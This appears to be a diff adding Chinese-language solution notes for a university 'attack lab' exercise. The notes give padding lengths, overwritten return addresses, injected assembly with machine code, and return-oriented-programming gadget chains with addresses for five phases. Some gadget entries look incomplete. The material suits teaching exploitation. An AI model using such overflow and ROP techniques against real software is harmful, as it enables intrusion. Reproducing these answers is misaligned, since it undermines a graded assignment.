@@ -1,0 +1,73 @@
+phase1:先用24个字节将栈帧填满，然后将return覆写为touch1地址00000000004019b3，小端输入。
+
+phase2:(cookie:0x79f87262)
+将汇编指令填入，后将栈帧24字节填满，然后将return地址覆写为汇编开始地址000000005561be48。
+汇编指令：
+movq $0x79f87262,%rdi
+pushq $0x4019df
+ret
+机器码：
+48 c7 c7 62 72 f8 79 68 df 19 40 00 c3 
+
+phase3:(cookie:0x79f87262 -> 37 39 66 38 37 32 36 32 00)
+将cookie转换为十六进制码存入ret后的栈中（%rsp+32），将该地址存入%rdi，后同上。
+栈：%rsp（24位可供注入），%rsp + 8 为ret地址（调用函数）
+汇编指令：
+mov $0x5561be68, %rdi
+pushq $0x401af0
+ret
+
+phase4：
+cookie: 62 72 f8 79
+addr: df 19 40
+gadget1:
+    popq %rax
+    ret
+    58 c3
+gadget2:
+    mov %rax, %rdi
+    ret
+    48 89 c7 c3
+gadget1 addr:98 1b 40
+gadget2 addr:ab 1b 40
+
+phase5:
+存储rsp栈顶指针的地址，通过加运算找到cookie所在位置。
+cookie: 37 39 66 38 37 32 36 32
+addr: f0 1a 40
+ 结构：
+gadget1:
+    movq %rsp, %rax
+    ret
+    2e 1c 40
+gadget2:
+    movq %rax, %r
+    ret
+    9e 1b 40
+gadget3:
+    popq %rax
+    ret
+    98 1b 40
+偏移量：0x48
+gadget4:
+    movl %eax, %ecx
+    ret
+    6b 1c 40
+gadget5:
+    movl %ecx, %edx
+    ret
+    4f 1c 40
+gadget6:
+    movl %edx, %esi
+    ret
+    57 1c 40
+gadget7:
+    add_xy();
+    ca 1b 40
+gadget8:
+    movq %rax, %rdi
+    ret
+    9e 1b 40
+addr: f0 1a 40
+cookie: 37 39 66 38 37 32 36 32
+
